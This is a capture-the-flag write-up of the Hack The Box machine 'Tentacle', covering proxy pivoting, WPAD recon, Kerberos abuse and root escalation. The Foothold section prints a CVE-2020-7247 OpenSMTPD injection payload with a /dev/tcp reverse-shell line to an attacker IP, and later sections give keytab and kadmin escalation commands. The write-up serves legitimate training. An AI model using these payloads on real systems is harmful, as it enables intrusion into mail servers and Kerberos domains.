# Tentacle

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.10.10.224 |
| **Status** | Retired |

## Overview
Tentacle is a Squid-proxy pivoting challenge built around the fictitious `REALCORP.HTB` domain. The externally reachable host is a Squid HTTP proxy that, once chained through, exposes an entire internal corporate network (DNS, Kerberos, WPAD, and eventually a mail server). The mail server runs a vulnerable OpenSMTPD build that provides the initial foothold; credentials recovered from a mail client configuration file are then used to obtain a valid Kerberos ticket for lateral movement, and a writable cron-managed log directory is abused to gain a second user before a Kerberos keytab file is leveraged with `kadmin`/`ksu` to escalate directly to root.

## Reconnaissance
`nmap -sC -sV` against the entry point (`nmap/initial`) showed:
```
22/tcp   open  ssh          OpenSSH 8.0
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
88/tcp   open  kerberos-sec MIT Kerberos
3128/tcp open  http-proxy   Squid http proxy 4.11
9090/tcp closed zeus-admin
```
The hostname `REALCORP.HTB` and the presence of only Kerberos/DNS/proxy services (no obvious application server) suggested more hosts existed behind this one, reachable only through the Squid proxy.

## Enumeration
Browsing the proxy's error page on port 8080 leaked an administrator e-mail address, `j.nakazawa@realcorp.htb` (a valid username), and the page footer disclosed the proxy's true hostname, `srv01.realcorp.htb`.

`dnsenum` against the exposed DNS server added two more internal hosts:
```
ns.realcorp.htb.    A     10.197.243.77
wpad.realcorp.htb.  A     10.197.243.31
```
These addresses are not routable directly, so `proxychains` was configured to tunnel traffic through the Squid proxy at `10.10.10.224:3128`. Chaining proxy entries (`10.10.10.224 → 127.0.0.1 → 10.197.243.77 → 10.197.243.31`) allowed scanning each newly discovered internal host in turn, eventually retrieving the WPAD proxy-auto-config file:
```javascript
function FindProxyForURL(url, host) {
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0")) return "DIRECT";
    return "PROXY proxy.realcorp.htb:3128";
}
```
This revealed a further internal subnet, `10.241.251.0/24`. A (very slow, `-Pn`, ICMP-blocked) `proxychains nmap` sweep found a single live host, `10.241.251.113`, with port 25 open running **OpenSMTPD 2.0.0**: vulnerable to **CVE-2020-7247**, a local/remote command execution bug in OpenSMTPD's SMTP `MAIL FROM` parsing.

## Foothold
Connecting to the SMTP server directly (via `proxychains nc 10.241.251.113 25`) and abusing the malformed envelope-sender parsing achieved command injection:
```
HELO i
MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d e f;do read i;done;bash;exit 0;>
RCPT TO:<j.nakazawa@realcorp.htb>
DATA
...
0<&196-;exec 196<>/dev/tcp/10.10.14.164/4444;sh <&196 >&196 2>&196
```
`files/exploit_smtpd.py` automates the same CVE-2020-7247 SMTP injection to write a command to an arbitrary file via the vulnerable envelope parser. With a `nc -lvp 4444` listener running, this produced a root shell on the SMTP host.

On this host, the only local user was `j.nakazawa`; their `.msmtprc` mail client configuration file disclosed a mail account password:
```
user: j.nakazawa
password: sJB}RM>6Z~64
```

## Privilege Escalation
The recovered credentials were used to obtain a Kerberos ticket for `j.nakazawa` against the KDC on `10.10.10.224`:
```bash
kinit j.nakazawa
klist j.nakazawa
ssh j.nakazawa@10.10.10.224   # authenticated via the Kerberos ticket, no password needed
```

**j.nakazawa → admin:** `linPEAS` enumeration on the main host found a cron job running every minute as `admin`:
```bash
/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.$(date +%F-%H%M%S) access.log cache.log
/usr/bin/rm -f access.log cache.log
```
`/var/log/squid/` was writable by `j.nakazawa`. Dropping a `.k5login` file (listing `j.nakazawa@REALCORP.HTB` as an authorized Kerberos principal) into `/var/log/squid/` and waiting for the cron job's `rsync` to copy it into `/home/admin/` allowed subsequent Kerberos-authenticated SSH logins as `admin`.

**admin → root:** As `admin`, several Kerberos configuration files under `/etc/` became readable, including the host keytab:
```bash
klist -k /etc/krb5.keytab
```
A Kerberos keytab allows authentication without a password. Using `kadmin` with the recovered keytab and the `kadmin/admin` principal:
```bash
kadmin -k -t krb5.keytab -p kadmin/admin@REALCORP.HTB
# inside kadmin:
add_principal -pw givemedaroot -maxlife 15m root@REALCORP.HTB
```
A new short-lived `root@REALCORP.HTB` Kerberos principal was created with a known password, then used with `ksu` (Kerberos switch-user) to obtain a root shell:
```bash
ksu root
# password: givemedaroot
```

## Lessons Learned
- Externally exposed proxy servers can be chained to reach entire internal network segments that are otherwise unroutable.
- WPAD/PAC files are an overlooked but valuable recon source for internal network topology.
- Legacy SMTP daemons (OpenSMTPD 2.0.0, CVE-2020-7247) can allow command injection through malformed envelope addresses.
- Writable directories touched by privileged cron jobs (even indirectly, via `rsync`) can be abused to plant configuration files like `.k5login` for lateral privilege escalation.
- Kerberos keytabs grant password-less authentication; if readable, they can be used with `kadmin`/`ksu` to mint or impersonate arbitrary principals, including `root`.

## Tools & References
- `files/exploit_smtpd.py`: custom Python client automating the OpenSMTPD CVE-2020-7247 injection.
- CVE-2020-7247: OpenSMTPD `MAIL FROM` parsing local/remote command execution.
- `proxychains`, `dnsenum`, `nmap`, `linPEAS`: used for internal pivoting and enumeration; not stored in this repository (public/standard tools).
- Original raw notes were merged into this write-up and removed from the repository (`HTB-Tentacle.txt`, `exploit_note`, `notes`).
